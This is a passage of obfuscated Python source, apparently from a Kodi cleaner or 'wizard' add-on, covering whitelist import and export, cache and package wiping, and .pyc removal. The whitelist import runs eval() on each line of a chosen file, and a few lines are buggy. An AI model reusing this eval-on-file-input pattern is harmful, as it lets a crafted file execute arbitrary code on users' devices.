                O00O0O000O0O00O0O +="[COLOR %s]%s[/COLOR] [COLOR %s]\"%s\"[/COLOR][CR]"%(COLOR1 ,O0OO0OOO0OOO0O00O ,COLOR2 ,OOOO000O0O00OOO0O )#line:3099
            TextBox ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),O00O0O000O0O00O0O )#line:3100
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No items in White List[/COLOR]"%COLOR2 )#line:3101
    elif O0O0O000O0O000OO0 =='import':#line:3102
        O00O00OO0000O0O00 =DIALOG .browse (1 ,'[COLOR %s]Select the whitelist file to import[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:3103
        log (str (O00O00OO0000O0O00 ))#line:3104
        if not O00O00OO0000O0O00 .endswith ('.txt'):#line:3105
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Cancelled![/COLOR]"%COLOR2 )#line:3106
            return #line:3107
        OO0O0OO0OO00O0000 =xbmcvfs .File (O00O00OO0000O0O00 )#line:3108
        O00O0OOO0OOO000O0 =OO0O0OO0OO00O0000 .read ()#line:3109
        OO0O0OO0OO00O0000 .close ()#line:3110
        O00O0000O0OOO0000 =whiteList ('read');OO0OO0OOO00000OO0 =[];O0OO00000000O0O0O =0 #line:3111
        for O0O00O0OO000OOOOO in O00O0000O0OOO0000 :#line:3112
            O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O000OO0O0O0O0OO00 =O0O00O0OO000OOOOO #line:3113
            OO0OO0OOO00000OO0 .append (OOOO000O0O00OOO0O )#line:3114
        OO000000OOOOOOOOO =O00O0OOO0OOO000O0 .split ('\n')#line:3115
        with open (WHITELIST ,'a')as OO0O0OO0OO00O0000 :#line:3116
            for O0O00O0OO000OOOOO in OO000000OOOOOOOOO :#line:3117
                try :#line:3118
                    O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O0000O0OO000O0OOO =eval (O0O00O0OO000OOOOO )#line:3119
                except Exception as OOOO000OO0OO00000 :#line:3120
                    log ("Error Adding: '%s' / %s"%(O0O00O0OO000OOOOO ,str (OOOO000OO0OO00000 )),5 )#line:3121
                    continue #line:3122
                log ("%s / %s / %s"%(O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O0000O0OO000O0OOO ),5 )#line:3123
                if not OOOO000O0O00OOO0O in OO0OO0OOO00000OO0 :#line:3124
                    O0OO00000000O0O0O +=1 #line:3125
                    OOO00OO0O0000000O ="['%s', '%s', '%s']"%(O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O0000O0OO000O0OOO )#line:3126
                    if len (OO0OO0OOO00000OO0 )+O0OO00000000O0O0O >1 :OOO00OO0O0000000O ="\n%s"%OOO00OO0O0000000O #line:3127
                    OO0O0OO0OO00O0000 .write (OOO00OO0O0000000O )#line:3128
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Item(s) Added[/COLOR]"%(COLOR2 ,O0OO00000000O0O0O ))#line:3129
    elif O0O0O000O0O000OO0 =='export':#line:3130
        O00O00OO0000O0O00 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the whitelist file[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:3131
        log (str (O00O00OO0000O0O00 ),5 )#line:3132
        try :#line:3133
            xbmcvfs .copy (WHITELIST ,os .path .join (O00O00OO0000O0O00 ,'whitelist.txt'))#line:3134
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]Whitelist has been exported to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00O00OO0000O0O00 ,'whitelist.txt')))#line:3135
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Exported[/COLOR]"%(COLOR2 ))#line:3136
        except Exception as OOOO000OO0OO00000 :#line:3137
            log ("Export Error: %s"%str (OOOO000OO0OO00000 ),5 )#line:3138
            if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The location you selected isnt writable would you like to select another one?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Location[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:3139
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Export Cancelled[/COLOR]"%(COLOR2 ,OOOO000OO0OO00000 ))#line:3140
            else :#line:3141
                O0000000OOO00OOO0 (export )#line:3142
    elif O0O0O000O0O000OO0 =='clear':#line:3143
        if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Are you sure you want to clear your whitelist?"%COLOR2 ,"This process can't be undone.[/COLOR]",yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:3144
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clear Whitelist Cancelled[/COLOR]"%(COLOR2 ))#line:3145
            return #line:3146
        try :#line:3147
            os .remove (WHITELIST )#line:3148
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Cleared[/COLOR]"%(COLOR2 ))#line:3149
        except :#line:3150
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Clearing Whitelist![/COLOR]"%(COLOR2 ))#line:3151
def clearPackages (over =None ):#line:3153
    try :#line:3154
        CleanPYO ()#line:3155
    except :pass #line:3156
    if os .path .exists (PACKAGES ):#line:3157
        try :#line:3158
            for O00O0OOOOO0OOOOO0 ,OOO0O00O0O0O00000 ,O0OO0OOO0O000000O in os .walk (PACKAGES ):#line:3159
                OO0000O0OOOO00O00 =0 #line:3160
                OO0000O0OOOO00O00 +=len (O0OO0OOO0O000000O )#line:3161
                if OO0000O0OOOO00O00 >0 :#line:3162
                    O000OO0000OOO0O0O =convertSize (getSize (PACKAGES ))#line:3163
                    if over :OOO0OO0O000O00O0O =1 #line:3164
                    else :OOO0OO0O000O00O0O =1 #line:3165
                    if OOO0OO0O000O00O0O :#line:3166
                        for OOOO00OOOOO0OOOOO in O0OO0OOO0O000000O :os .unlink (os .path .join (O00O0OOOOO0OOOOO0 ,OOOO00OOOOO0OOOOO ))#line:3167
                        for O0OO0O0O00OO00OOO in OOO0O00O0O0O00000 :shutil .rmtree (os .path .join (O00O0OOOOO0OOOOO0 ,O0OO0O0O00OO00OOO ))#line:3168
        except Exception as OO00000000OOOOO0O :#line:3171
            log ("Clear Packages Error: %s"%str (OO00000000OOOOO0O ),5 )#line:3173
def clearPackagesStartup ():#line:3176
    OO0O0OOO00OO00OOO =datetime .utcnow ()-timedelta (minutes =3 )#line:3177
    O0O000OOO0OO0OO00 =0 ;OO0O0O0000OO00O00 =0 #line:3178
    if os .path .exists (PACKAGES ):#line:3179
        OO0O0OO00O0OO0OOO =os .listdir (PACKAGES )#line:3180
        OO0O0OO00O0OO0OOO .sort (key =lambda OOO0OOO0OOOOOOO0O :os .path .getmtime (os .path .join (PACKAGES ,OOO0OOO0OOOOOOO0O )))#line:3181
        try :#line:3182
            for OOO00O0OO0O0OOO0O in OO0O0OO00O0OO0OOO :#line:3183
                OOO000O0000000O0O =os .path .join (PACKAGES ,OOO00O0OO0O0OOO0O )#line:3184
                OO0OOO000O0O00OOO =datetime .utcfromtimestamp (os .path .getmtime (OOO000O0000000O0O ))#line:3185
                if OO0OOO000O0O00OOO <=OO0O0OOO00OO00OOO :#line:3186
                    if os .path .isfile (OOO000O0000000O0O ):#line:3187
                        O0O000OOO0OO0OO00 +=1 #line:3188
                        OO0O0O0000OO00O00 +=os .path .getsize (OOO000O0000000O0O )#line:3189
                        os .unlink (OOO000O0000000O0O )#line:3190
                    elif os .path .isdir (OOO000O0000000O0O ):#line:3191
                        OO0O0O0000OO00O00 +=getSize (OOO000O0000000O0O )#line:3192
                        OO0O000OO00O000O0 ,O000O00OO00O0OOO0 =cleanHouse (OOO000O0000000O0O )#line:3193
                        O0O000OOO0OO0OO00 +=OO0O000OO00O000O0 +O000O00OO00O0OOO0 #line:3194
                        try :#line:3195
                            shutil .rmtree (OOO000O0000000O0O )#line:3196
                        except Exception as OOO00OO0OO0O0O0O0 :#line:3197
                            log ("Failed to remove %s: %s"%(OOO000O0000000O0O ,str (OOO00OO0OO0O0O0O0 ),5 ))#line:3198
            if O0O000OOO0OO0OO00 >0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success: %s[/COLOR]'%(COLOR2 ,convertSize (OO0O0O0000OO00O00 )))#line:3199
            else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3200
        except Exception as OOO00OO0OO0O0O0O0 :#line:3201
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:3202
            log ("Clear Packages Error: %s"%str (OOO00OO0OO0O0O0O0 ),5 )#line:3203
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3204
def clearCache (over =None ):#line:3206
    OOO000O0OO000O0OO =os .path .join (PROFILE ,'addon_data')#line:3217
    O0OO000OO0OOOOOOO =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:3226
    OOO0OO0OO00OOOO00 =[(OOO000O0OO000O0OO ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),os .path .join (translatepath ('special://profile/addon_data/plugin.program.autocompletion/Google'),''),os .path .join (translatepath ('special://profile/addon_data/script.skin.helper.colorpicker/colors'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.All_Subs/temp_wizdom'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.All_Subs/temp'),''),os .path .join (translatepath ('special://profile/addon_data/script.colorbox'),''),os .path .join (translatepath ('special://profile/addon_data/script.module.metadatautils/animatedgifs'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/ArtistInformation'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/ArtistSlideshow'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/merge'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/temp'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/transition'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/resources'),''),os .path .join (translatepath ('special://profile/addon_data/plugin.video.movixws/logos'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.subscenter/temp'),''),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONS ,'temp')),(os .path .join (OOO000O0OO000O0OO ,'script.module.simple.downloader')),(os .path .join (OOO000O0OO000O0OO ,'plugin.video.itv','Images'))]#line:3255
    O000OOOOO0O0O0000 =0 #line:3256
    OO000OOOO00OOOOO0 =['meta_cache','archive_cache']#line:3257
    for OO0OOO0OO0OO0000O in OOO0OO0OO00OOOO00 :#line:3258
        if os .path .exists (OO0OOO0OO0OO0000O )and not OO0OOO0OO0OO0000O in [ADDONDATA ,OOO000O0OO000O0OO ]:#line:3259
            for O0OOOOO0O0000O0O0 ,OOO0O00O000000O0O ,O0O00OO00OO00OOOO in os .walk (OO0OOO0OO0OO0000O ):#line:3260
                OOO0O00O000000O0O [:]=[O0OOO0OOO00OO0O0O for O0OOO0OOO00OO0O0O in OOO0O00O000000O0O if O0OOO0OOO00OO0O0O not in OO000OOOO00OOOOO0 ]#line:3261
                O000O00O0000OO0O0 =0 #line:3262
                O000O00O0000OO0O0 +=len (O0O00OO00OO00OOOO )#line:3263
                if O000O00O0000OO0O0 >0 :#line:3264
                    for O0O0000000O00O000 in O0O00OO00OO00OOOO :#line:3265
                        if not O0O0000000O00O000 in LOGFILES :#line:3266
                            try :#line:3267
                                os .unlink (os .path .join (O0OOOOO0O0000O0O0 ,O0O0000000O00O000 ))#line:3268
                                log ("[Wiped] %s"%os .path .join (O0OOOOO0O0000O0O0 ,O0O0000000O00O000 ),5 )#line:3269
                                O000OOOOO0O0O0000 +=1 #line:3270
                            except :#line:3271
                                pass #line:3272
                        else :log ('Ignore Log File: %s'%O0O0000000O00O000 ,5 )#line:3273
                    for OO0O00OO000OO0OO0 in OOO0O00O000000O0O :#line:3274
                        try :#line:3275
                            shutil .rmtree (os .path .join (O0OOOOO0O0000O0O0 ,OO0O00OO000OO0OO0 ))#line:3276
                            O000OOOOO0O0O0000 +=1 #line:3277
                            log ("[Success] cleared %s files from %s"%(str (O000O00O0000OO0O0 ),os .path .join (OO0OOO0OO0OO0000O ,OO0O00OO000OO0OO0 )),5 )#line:3278
                        except :#line:3279
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OO0OOO0OO0OO0000O ,OO0O00OO000OO0OO0 ),5 )#line:3280
    if os .path .exists (PACKAGES ):#line:3292
        try :#line:3293
            for O0OOOOO0O0000O0O0 ,OOO0O00O000000O0O ,O0O00OO00OO00OOOO in os .walk (PACKAGES ):#line:3294
                O000O00O0000OO0O0 =0 #line:3295
                O000O00O0000OO0O0 +=len (O0O00OO00OO00OOOO )#line:3296
                if O000O00O0000OO0O0 >0 :#line:3297
                    O000O0OO00OO0OO00 =convertSize (getSize (PACKAGES ))#line:3298
                    if over :O00OO0O000OO00OO0 =1 #line:3299
                    else :O00OO0O000OO00OO0 =1 #line:3300
                    if O00OO0O000OO00OO0 :#line:3301
                        for O0O0000000O00O000 in O0O00OO00OO00OOOO :os .unlink (os .path .join (O0OOOOO0O0000O0O0 ,O0O0000000O00O000 ))#line:3302
                        for OO0O00OO000OO0OO0 in OOO0O00O000000O0O :shutil .rmtree (os .path .join (O0OOOOO0O0000O0O0 ,OO0O00OO000OO0OO0 ))#line:3303
        except Exception as O00O00000O0OO000O :#line:3306
            log ("Clear Packages Error: %s"%str (O00O00000O0OO000O ),5 )#line:3308
    if INCLUDEVIDEO =='true'and over ==None :#line:3310
        O0O00OO00OO00OOOO =[]#line:3311
        if INCLUDEALL =='true':O0O00OO00OO00OOOO =O0OO000OO0OOOOOOO #line:3312
        else :#line:3313
            if INCLUDEBOB =='true':O0O00OO00OO00OOOO .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:3314
            if INCLUDEPHOENIX =='true':O0O00OO00OO00OOOO .append (os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db'))#line:3315
            if INCLUDESPECTO =='true':O0O00OO00OO00OOOO .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:3316
            if INCLUDEGENESIS =='true':O0O00OO00OO00OOOO .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:3317
            if INCLUDEEXODUS =='true':O0O00OO00OO00OOOO .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:3318
            if INCLUDEONECHAN =='true':O0O00OO00OO00OOOO .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:3319
            if INCLUDESALTS =='true':O0O00OO00OO00OOOO .append (os .path .join (DATABASE ,'saltscache.db'))#line:3320
            if INCLUDESALTSHD =='true':O0O00OO00OO00OOOO .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:3321
        if len (O0O00OO00OO00OOOO )>0 :#line:3322
            for OO0OOO0OO0OO0000O in O0O00OO00OO00OOOO :#line:3323
                if os .path .exists (OO0OOO0OO0OO0000O ):#line:3324
                    O000OOOOO0O0O0000 +=1 #line:3325
                    try :#line:3326
                        OOO000O0O00O0OOO0 =database .connect (OO0OOO0OO0OO0000O )#line:3327
                        O00000000OO0O0000 =OOO000O0O00O0OOO0 .cursor ()#line:3328
                    except Exception as O00O00000O0OO000O :#line:3329
                        log ("DB Connection error: %s"%str (O00O00000O0OO000O ),5 )#line:3330
                        continue #line:3331
                    if 'Database'in OO0OOO0OO0OO0000O :#line:3332
                        try :#line:3333
                            O00000000OO0O0000 .execute ("DELETE FROM url_cache")#line:3334
                            O00000000OO0O0000 .execute ("VACUUM")#line:3335
                            OOO000O0O00O0OOO0 .commit ()#line:3336
                            O00000000OO0O0000 .close ()#line:3337
                            log ("[Success] wiped %s"%OO0OOO0OO0OO0000O ,5 )#line:3338
                        except Exception as O00O00000O0OO000O :#line:3339
                            log ("[Failed] wiped %s: %s"%(OO0OOO0OO0OO0000O ,str (O00O00000O0OO000O )),5 )#line:3340
                    else :#line:3341
                        O00000000OO0O0000 .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:3342
                        for OO00OOO000O00OO00 in O00000000OO0O0000 .fetchall ():#line:3343
                            try :#line:3344
                                O00000000OO0O0000 .execute ("DELETE FROM %s"%OO00OOO000O00OO00 [0 ])#line:3345
                                O00000000OO0O0000 .execute ("VACUUM")#line:3346
                                OOO000O0O00O0OOO0 .commit ()#line:3347
                                log ("[Success] wiped %s in %s"%(OO00OOO000O00OO00 ,OO0OOO0OO0OO0000O ),5 )#line:3348
                            except Exception as O00O00000O0OO000O :#line:3349
                                log ("[Failed] wiped %s in %s: %s"%(OO00OOO000O00OO00 ,OO0OOO0OO0OO0000O ,str (O00O00000O0OO000O )),5 )#line:3350
                        O00000000OO0O0000 .close ()#line:3351
        else :log ("Clear Cache: Clear Video Cache Not Enabled",5 )#line:3352
def clearCache3 ():#line:3355
    O000O0O0OO0OO000O =os .path .join (PROFILE ,'addon_data')#line:3357
    OO0O00OO0O00O0OOO =[(O000O0O0OO0OO000O ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.bob.unleashed','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.covenant','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.elementum','app.db-wal')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db')),(os .path .join (O000O0O0OO0OO000O ,'script.module.simple.downloader')),(os .path .join (O000O0O0OO0OO000O ,'plugin.video.itv','Images'))]#line:3377
    OO0O0O0OOOOO00O00 =0 #line:3379
    for O0O0OO0O0000O00OO in OO0O00OO0O00O0OOO :#line:3381
        if os .path .exists (O0O0OO0O0000O00OO )and not O0O0OO0O0000O00OO in [ADDONDATA ,O000O0O0OO0OO000O ]:#line:3382
            for OOO000O00OOO0O00O ,O00OO00OO0OOO0O0O ,O0O0OO0O000O0OO00 in os .walk (O0O0OO0O0000O00OO ):#line:3383
                O0O0OOOO000O00O00 =0 #line:3384
                O0O0OOOO000O00O00 +=len (O0O0OO0O000O0OO00 )#line:3385
                if O0O0OOOO000O00O00 >0 :#line:3386
                    for OOOOOO0000O0O0OO0 in O0O0OO0O000O0OO00 :#line:3387
                        if not OOOOOO0000O0O0OO0 in ['kodi.log','tvmc.log','spmc.log','xbmc.log']:#line:3388
                            try :#line:3389
                                os .unlink (os .path .join (OOO000O00OOO0O00O ,OOOOOO0000O0O0OO0 ))#line:3390
                            except :#line:3391
                                pass #line:3392
                        else :log ('Ignore Log File: %s'%OOOOOO0000O0O0OO0 )#line:3393
                    for O00O0000OOOOO0O00 in O00OO00OO0OOO0O0O :#line:3394
                        try :#line:3395
                            shutil .rmtree (os .path .join (OOO000O00OOO0O00O ,O00O0000OOOOO0O00 ))#line:3396
                            OO0O0O0OOOOO00O00 +=1 #line:3397
                            log ("[COLOR red][Success]  %s Files Removed From %s [/COLOR]"%(str (O0O0OOOO000O00O00 ),os .path .join (O0O0OO0O0000O00OO ,O00O0000OOOOO0O00 )))#line:3398
                        except :#line:3399
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (O0O0OO0O0000O00OO ,O00O0000OOOOO0O00 ))#line:3400
        else :#line:3401
            for OOO000O00OOO0O00O ,O00OO00OO0OOO0O0O ,O0O0OO0O000O0OO00 in os .walk (O0O0OO0O0000O00OO ):#line:3402
                for O00O0000OOOOO0O00 in O00OO00OO0OOO0O0O :#line:3403
                    if 'cache'in O00O0000OOOOO0O00 .lower ():#line:3404
                        try :#line:3405
                            shutil .rmtree (os .path .join (OOO000O00OOO0O00O ,O00O0000OOOOO0O00 ))#line:3406
                            OO0O0O0OOOOO00O00 +=1 #line:3407
                            log ("[COLOR white][Success] Wiped %s [/COLOR]"%os .path .join (O0O0OO0O0000O00OO ,O00O0000OOOOO0O00 ))#line:3408
                        except :#line:3409
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (O0O0OO0O0000O00OO ,O00O0000OOOOO0O00 ))#line:3410
    LogNotify (ADDONTITLE ,'[COLOR white]Cache:[/COLOR] [COLOR red] %s Items Removed[/COLOR]'%OO0O0O0OOOOO00O00 )#line:3412
origfolder =(translatepath ("special://home/addons"))#line:3413
def CleanPYO ():#line:3414
    O000O000O000OO0OO =0 #line:3415
    for (OOOO00O0000O0O000 ,O000OOO00OOO00OO0 ,O00O00O000OOOO000 )in os .walk (origfolder ):#line:3416
       for O0OOO000O0OO0000O in O00O00O000OOOO000 :#line:3417
          if O0OOO000O0OO0000O .endswith ('.pyo'):#line:3418
               os .remove (os .path .join (OOOO00O0000O0O000 ,O0OOO000O0OO0000O ))#line:3420
          if O0OOO000O0OO0000O .endswith ('.pyc'):#line:3421
               os .remove (os .path .join (OOOO00O0000O0O000 ,O0OOO000O0OO0000O ))#line:3423
def fixwizard (over =None ):#line:3424
    O0000O0000OOO000O =os .path .join (PROFILE ,'addon_data')#line:3426
    OO0O000O00OO0O000 =[(O0000O0000OOO000O ),(ADDONDATA ),os .path .join (translatepath ('special://profile/addon_data/plugin.program.Anonymous'),'')]#line:3431
    O0OO0000OO0O000O0 =0 #line:3432
    O0O0OO000O000O0OO =['meta_cache','archive_cache']#line:3433
    for OOO0OO000O0OOOOOO in OO0O000O00OO0O000 :#line:3434
        if os .path .exists (OOO0OO000O0OOOOOO )and not OOO0OO000O0OOOOOO in [ADDONDATA ,O0000O0000OOO000O ]:#line:3435
            for OOOO000OO00OOOOOO ,O0O0O000O00O0OO00 ,O0OO00OO0OOO0OOO0 in os .walk (OOO0OO000O0OOOOOO ):#line:3436
                O0O0O000O00O0OO00 [:]=[OO00OO0O0O00OO000 for OO00OO0O0O00OO000 in O0O0O000O00O0OO00 if OO00OO0O0O00OO000 not in O0O0OO000O000O0OO ]#line:3437
                O0O0O0O000OOOOO00 =0 #line:3438
                O0O0O0O000OOOOO00 +=len (O0OO00OO0OOO0OOO0 )#line:3439
                if O0O0O0O000OOOOO00 >0 :#line:3440
                    for OOO0OOO0O00OO0O00 in O0OO00OO0OOO0OOO0 :#line:3441
                        if not OOO0OOO0O00OO0O00 in LOGFILES :#line:3442
                            try :#line:3443
                                os .unlink (os .path .join (OOOO000OO00OOOOOO ,OOO0OOO0O00OO0O00 ))#line:3444
                                log ("[Wiped] %s"%os .path .join (OOOO000OO00OOOOOO ,OOO0OOO0O00OO0O00 ),5 )#line:3445
                                O0OO0000OO0O000O0 +=1 #line:3446
                            except :#line:3447
                                pass #line:3448
                        else :log ('Ignore Log File: %s'%OOO0OOO0O00OO0O00 ,5 )#line:3449
                    for OO000O0OOOOOO0O00 in O0O0O000O00O0OO00 :#line:3450
                        try :#line:3451
                            shutil .rmtree (os .path .join (OOOO000OO00OOOOOO ,OO000O0OOOOOO0O00 ))#line:3452
                            O0OO0000OO0O000O0 +=1 #line:3453
                            log ("[Success] cleared %s files from %s"%(str (O0O0O0O000OOOOO00 ),os .path .join (OOO0OO000O0OOOOOO ,OO000O0OOOOOO0O00 )),5 )#line:3454
                        except :#line:3455
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OOO0OO000O0OOOOOO ,OO000O0OOOOOO0O00 ),5 )#line:3456
        else :#line:3457
            for OOOO000OO00OOOOOO ,O0O0O000O00O0OO00 ,O0OO00OO0OOO0OOO0 in os .walk (OOO0OO000O0OOOOOO ):#line:3458
                O0O0O000O00O0OO00 [:]=[O0OO0OO00O00OO0OO for O0OO0OO00O00OO0OO in O0O0O000O00O0OO00 if O0OO0OO00O00OO0OO not in O0O0OO000O000O0OO ]#line:3459
                for OO000O0OOOOOO0O00 in O0O0O000O00O0OO00 :#line:3460
                    if not str (OO000O0OOOOOO0O00 .lower ()).find ('cache')==-1 :#line:3461
                        try :#line:3462
                            shutil .rmtree (os .path .join (OOOO000OO00OOOOOO ,OO000O0OOOOOO0O00 ))#line:3463
                            O0OO0000OO0O000O0 +=1 #line:3464
                            log ("[Success] wiped %s "%os .path .join (OOOO000OO00OOOOOO ,OO000O0OOOOOO0O00 ),5 )#line:3465
                        except :#line:3466
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OOO0OO000O0OOOOOO ,OO000O0OOOOOO0O00 ),5 )#line:3467
    if os .path .exists (PACKAGES ):#line:3468
        try :#line:3469
            for OOOO000OO00OOOOOO ,O0O0O000O00O0OO00 ,O0OO00OO0OOO0OOO0 in os .walk (PACKAGES ):#line:3470
                O0O0O0O000OOOOO00 =0 #line:3471
                O0O0O0O000OOOOO00 +=len (O0OO00OO0OOO0OOO0 )#line:3472
                if O0O0O0O000OOOOO00 >0 :#line:3473
                    OOOOOO0000O000000 =convertSize (getSize (PACKAGES ))#line:3474
                    if over :OOOOOO000O000OO0O =1 #line:3475
                    else :OOOOOO000O000OO0O =1 #line:3476
                    if OOOOOO000O000OO0O :#line:3477
                        for OOO0OOO0O00OO0O00 in O0OO00OO0OOO0OOO0 :os .unlink (os .path .join (OOOO000OO00OOOOOO ,OOO0OOO0O00OO0O00 ))#line:3478
                        for OO000O0OOOOOO0O00 in O0O0O000O00O0OO00 :shutil .rmtree (os .path .join (OOOO000OO00OOOOOO ,OO000O0OOOOOO0O00 ))#line:3479
                        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success![/COLOR]'%COLOR2 )#line:3480
        except Exception as O0000OO0OOOO00O00 :#line:3482
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:3483
            log ("Clear Packages Error: %s"%str (O0000OO0OOOO00O00 ),5 )#line:3484
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3485
    LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]איפוס עבר בהצלחה %s Files[/COLOR]'%(COLOR2 ,O0OO0000OO0O000O0 ))#line:3487
def checkSources ():#line:3489
    if not os .path .exists (SOURCES ):#line:3490
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Sources.xml File Found![/COLOR]"%COLOR2 )#line:3491
        return False #line:3492
    OOOOOOO00O0OOOO0O =0 #line:3493
    OO0OO00OOOO00000O =[]#line:3494
    O0OOOOO00OOOOOO0O =[]#line:3495
    O00O000000O0OO0OO =open (SOURCES )#line:3496
    OOOOO0OOOO0O000O0 =O00O000000O0OO0OO .read ()#line:3497
    O0OO0OOO0O00O0O00 =OOOOO0OOOO0O000O0 .replace ('\r','').replace ('\n','').replace ('\t','')#line:3498
    O0OO0000O0OO00O0O =re .compile ('<files>.+?</files>').findall (O0OO0OOO0O00O0O00 )#line:3499
    O00O000000O0OO0OO .close ()#line:3500
    if len (O0OO0000O0OO00O0O )>0 :#line:3501
        OO00000OOO0OO0OOO =re .compile ('<source>.+?<name>(.+?)</name>.+?<path pathversion="1">(.+?)</path>.+?<allowsharing>(.+?)</allowsharing>.+?</source>').findall (O0OO0000O0OO00O0O [0 ])#line:3502
        DP .create (ADDONTITLE ,"[COLOR %s]Scanning Sources for Broken links[/COLOR]"%COLOR2 )#line:3503
        for O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0O00OO000O000OO in OO00000OOO0OO0OOO :#line:3504
            OOOOOOO00O0OOOO0O +=1 #line:3505
            O0OO000000OO00O0O =int (percentage (OOOOOOO00O0OOOO0O ,len (OO00000OOO0OO0OOO )))#line:3506
